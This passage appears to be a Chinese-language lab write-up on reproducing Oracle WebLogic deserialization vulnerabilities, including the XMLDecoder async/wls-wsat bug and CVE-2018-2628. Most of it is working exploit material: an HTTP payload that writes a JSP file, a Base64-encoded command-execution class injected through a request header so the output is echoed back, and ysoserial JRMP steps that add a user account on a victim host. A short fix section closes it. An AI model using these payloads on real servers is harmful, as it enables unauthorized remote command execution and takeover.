public EventData(String xml) {
    ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());
    try {
     XMLDecoder decoder = new XMLDecoder(bais);
     this.eventData = (Map) decoder.readObject();
    } catch (Exception e) {
     throw new EventException("Error decoding " + xml, e);
    }
}
构造写入文件Payload，如下。
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.124.129:7001
User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml
Content-Length: 962
   oracle.toplink.internal.sessions.UnitOfWorkChangeSetorg.slf4j.ext.EventData
        servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp
       lxhsecTest
      ]]>
结果:
wls-wsat.war
Weblogic 10.3.6 回显构造
回显构造.
bea_wls9_async_response.war的反序列化链无法造成回显，但是wls-wsat.war的却可以。
访问：/wls-wsat/CoordinatorPortType
以下测试均在 JDK 1.6.0_45 64bit 下进行。
拿lufei大佬的工具改改。
这里我直接使用lufei的工具，发现 > 等特殊字符，会被当成字符串。
这里将工具的exec函数更改，如下：
import java.io.*;
public class ResultBaseExec {
    public static String exec(String cmd) throws Exception {
        String osTyp = System.getProperty("os.name");
        Process p;
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            //执行命令
//            p = Runtime.getRuntime().exec("cmd /c " + cmd);
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        }else{
            //执行命令
//            p = Runtime.getRuntime().exec("/bin/sh -c " + cmd);
            p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        }
        InputStream fis=p.getInputStream();
        InputStreamReader isr=new InputStreamReader(fis);
        BufferedReader br=new BufferedReader(isr);
        String line=null;
        String result = "";
        while((line=br.readLine())!=null)
        {
            result = result + line;
        }
        return result;
    }
}
编译成.class文件
"C:\Program Files\Java\jdk1.6.0_45\bin\javac.exe" C:\Users\lxhsec\Downloads\WeblogicCode\src\main\java\ResultBaseExec.java
接着将.class转换成Base64，当然你转成hex这些也可以。
import sun.misc.BASE64Encoder;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
public class toBase64 {
    public static byte[] toByteArray(InputStream in) throws IOException, IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024 * 4];
        int n = 0;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }
    public static void main(final String[] args) throws Exception {
        BASE64Encoder base64Encoder = new BASE64Encoder();
        //class文件路径
        InputStream in = new FileInputStream("C:\\Users\\lxhsec\\Downloads\\WeblogicCode\\src\\main\\java\\ResultBaseExec.class");
        byte[] data = toByteArray(in);
        in.close();
        String encode = base64Encoder.encodeBuffer(data);
        System.out.println(encode);
    }
}
yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0x
生成之后使用test_code测试，发现>被解析成了我们想要的。
替换
clazz.makeClassInitializer()
        .insertAfter(""
                + "String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\"lfcmd\");\n"
                + "String R = \"yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQA
                + "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
                + "byte[] bt = decoder.decodeBuffer(R);"
                + "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
                + "Class cl = cls.defineClass(\"ResultBaseExec\",bt);"
                + "java.lang.reflect.Method m = cl.getMethod(\"exec\",new Class[]{String.class});"
                + "Object object = m.invoke(cl.newInstance(),new Object[]{ua});"
                + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrent
                + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
                + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n"
                + "outputStream.flush();\n"
                + "response.getWriter().write(\"\");"
                + "");
然后运行JDK7u21,编译生成Byte[], 执行。
Weblogic 12.1.3 回显构造
回显构造.
将
clazz.makeClassInitializer()
        .insertAfter(""
                + "String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\"lfcmd\");\n"
                + "String R = \"yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQA
                + "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
                + "byte[] bt = decoder.decodeBuffer(R);"
                + "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
                + "Class cl = cls.defineClass(\"ResultBaseExec\",bt);"
                + "java.lang.reflect.Method m = cl.getMethod(\"exec\",new Class[]{String.class});"
                + "Object object = m.invoke(cl.newInstance(),new Object[]{ua});"
                + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrent
                + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
                + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n"
                + "outputStream.flush();\n"
                + "response.getWriter().write(\"\");"
                + "");
转换成XMl格式，参考lufei给出的，稍微改一下。
org.slf4j.ext.EventData
                yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBB
                ResultBaseExec
                        whoami
                        connectionHandler
                            true
执行:
Weblogic WLS Core Components 反序列化命令执行漏洞（
反序列化命令执行漏洞（CVE-2018-2628）
）
Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意
命令。
使用exploit.py脚本进行复现,具体使用方法见脚本。
Kail Attack ：192.168.31.232
Win03 victim : 192.168.124.130
Kail 执行
1）下载ysoserial.jar
wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
2）使用ysoserial.jar，启动JRMP Server
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
其中，[command]是想执行的命令，而[listen port]是JRMP Server监听的端口。、
这里我执
行java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'net user xiaohao xiaohao /add'
3）执行exploit.py
python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地（Kail系统上的）ysoserial的路径，[JRMPListener ip]和[JRMPListener
port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2
这里我执行python2 exploit.py 192.168.124.130 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.232 1099 JRMPClient2
结果如下：
修复建议
修复建议
1.过滤t3协议。
在域结构中点击 安全->筛选器
连接筛选器填: weblogic.security.net.ConnectionFilterImpl 保存后重启Weblogic.
kail再次攻击，Exp将报错。
连接筛选器规则可参考官方文档
2.安装补丁，但是保不准下一次Weblogic缝缝补补的黑名单又被绕过。
Weblogic 任意文件上传漏洞（